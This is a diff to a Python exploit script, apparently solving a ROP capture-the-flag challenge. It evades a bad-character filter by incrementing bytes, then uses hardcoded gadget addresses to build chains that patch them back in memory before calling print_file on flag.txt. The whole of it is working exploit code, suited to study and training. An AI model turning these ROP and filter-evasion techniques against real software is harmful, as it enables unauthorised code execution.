@@ -51,6 +51,9 @@ payload_locations = [
     b'\x58\xa0\x04\x08'
 ]
 
+transformed = []
+deadcode   = b'\xde\xc0\xad\xde'
+
 def write_what_where_sanitize(data, addr):
     """
         4-byte write primitive using the following gadgets:
@@ -73,7 +76,7 @@ def write_what_where_sanitize(data, addr):
 
     ## Modify data prior to writing it to the stack
     print(f"Original data: {data}")
-    data_sanitized = sanitize(data)
+    data_sanitized = sanitize(data, addr)
 
     print(f"Writing sanitized data: {data_sanitized}")
 
@@ -90,19 +93,32 @@ def write_what_where_sanitize(data, addr):
 
     return payload
 
-def sanitize(data):
-    badchars              = ['x', 'g', 'a', '.']
-    new_bytes             = b''
+def sanitize(data, start_addr):
+    """
+        Iterate over data at start_addr,
+        Transform characters as needed (by adding one)
+        And keep track of the address of each of the
+        transformed characters.
+    """
+    badchars    = ['x', 'g', 'a', '.']
+    new_bytes   = b''
 
-    for c in data:
+    for idx, c in enumerate(data):
         if chr(c) in badchars:
+
+            # Add one to the byte to evade the filtering
+            # Store the address where the modified data is
+            modified_addr = struct.pack("<I", (struct.unpack("<I", start_addr)[0] + idx))
+            print(f"Modified data at {modified_addr.hex()})")
+            transformed.append(modified_addr)
+
             new_bytes += bytes([(c+1)])
         else:
             new_bytes += bytes([c])
 
     return new_bytes
 
-def patch_bytes(data):
+def patch_byte(addr):
     """
         to get around filtering, will add one to each of the badchars if they appear in the string.
         thus, if we see a character which is (badchar+1),
@@ -114,20 +130,30 @@ def patch_bytes(data):
         can control ebp and bl with this gadget:
         0x080485b8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
     """
-    # TODO: this needs work
-    needs_transform_chars = ['y', 'h', 'b', '/']
-    print(data)
-    print(type(data))
+    pop_ebx_pop_esi_pop_edi_pop_ebp_ret = b'\xb8\x85\x04\x08'
+    sub_byte_ptr_ebp_bl_ret             = b'\x4b\x85\x04\x08'
 
-    for c in data:
-        if chr(c) in needs_transform_chars:
-            print(f"Need to transform: {c}")
+    print(f"Transforming data at {addr.hex()}")
+
+    """ jump to pop/pop/pop/pop/ret gadget;
+        set up registers for sub call;
+        ret to sub call
+    """
+    payload = pop_ebx_pop_esi_pop_edi_pop_ebp_ret + \
+            b'\x01AA\x01' + \
+            deadcode + \
+            deadcode + \
+            addr + \
+            sub_byte_ptr_ebp_bl_ret
+
+    return payload
 
 flag_str   = b'flag'
 dot_txt    = b'.txt'
 null_bytes = b'\x00lol' # to terminate the string
 
-print_file = b'\x14\xa0\x04\x08'
+#print_file = b'\x14\xa0\x04\x08'
+print_file = b'\xd0\x83\x04\x08' # 0x080483d0
 deadcode   = b'\xde\xc0\xad\xde'
 
 payload = b'A'*40
@@ -139,9 +165,8 @@ payload += write_what_where_sanitize(dot_txt, payload_locations[1])
 payload += write_what_where_sanitize(null_bytes, payload_locations[2])
 
 # rop to modify bytes as necessary
-payload += patch_bytes(payload_locations[0])
-payload += patch_bytes(payload_locations[1])
-payload += patch_bytes(payload_locations[2])
+for addr in transformed:
+    payload += patch_byte(addr)
 
 payload += print_file            # function to exec
 payload += deadcode              # return for print_file
